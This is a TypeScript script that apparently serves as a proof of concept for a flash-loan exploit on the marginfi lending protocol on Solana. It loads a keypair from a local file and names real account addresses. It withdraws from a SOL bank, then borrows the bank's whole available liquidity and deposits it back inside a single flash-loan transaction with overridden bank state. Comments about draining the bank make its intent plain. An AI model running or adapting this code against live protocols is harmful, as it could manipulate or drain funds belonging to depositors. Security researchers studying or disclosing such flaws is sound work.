import { Keypair, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
import { MarginfiAccountWrapper, MarginfiClient } from "../src";
import { confirmOrAbort, getMarginfiClient } from "./utils";
import fs from 'fs'
import { Wallet } from "@coral-xyz/anchor";
const payer = Keypair.fromSecretKey(
  Uint8Array.from(
    JSON.parse(fs.readFileSync('/home/ubuntu/7i.json', 'utf-8')),
  ),
);
async function main() {
  const client = await getMarginfiClient({readonly: false, authority: new PublicKey("7ihN8QaTfNoDTRTQGULCzbUT3PHwPDTu5Brcu4iT2paP")})
  // client.ts     public wallet: Wallet,

  client.wallet = new Wallet(payer);

  console.log(`Using ${client.config.environment} environment; wallet: ${client.wallet.publicKey.toBase58()}`);
 

  const marginfiAccount = await MarginfiAccountWrapper.fetch("EW1iozTBrCgyd282g2eemSZ8v5xs7g529WFv4g69uuj2", client);

  const solBank = client.getBankByTokenSymbol("SOL");
  if (!solBank) throw Error("SOL bank not found");

  const amount = 10; // SOL
  try {
  const annnnnndItsGone = await marginfiAccount.withdraw(1 / LAMPORTS_PER_SOL, solBank.address, true, 138138 / LAMPORTS_PER_SOL);
  console.log(annnnnndItsGone)
  console.log(' Your sol bank is now empty, for the purposes of this demonstration we need it empty to begin w. <3');
  }
  catch (err){
    console.log("I assume you didn't have a deposit I could drain to show the demo; ignoring error:")
    console.log(err)
  }
  const borrowIx = await marginfiAccount.makeBorrowIx(solBank.getTotalAssetQuantity().minus(solBank.getTotalLiabilityQuantity()).toNumber() / solBank.mintDecimals ** 10, solBank.address);
  const thankUMrgnFiDeposit = await marginfiAccount.makeDepositIx(solBank.getTotalAssetQuantity().minus(solBank.getTotalLiabilityQuantity()).toNumber() / solBank.mintDecimals ** 10, solBank.address);
  const override_banks = new Map()
  override_banks.set(solBank.address, solBank);
  await marginfiAccount.flashLoan({
    ixs: [...borrowIx.instructions, ...thankUMrgnFiDeposit.instructions],
    signers: [payer]
  }, override_banks);
}

main().catch((e) => console.log(e));
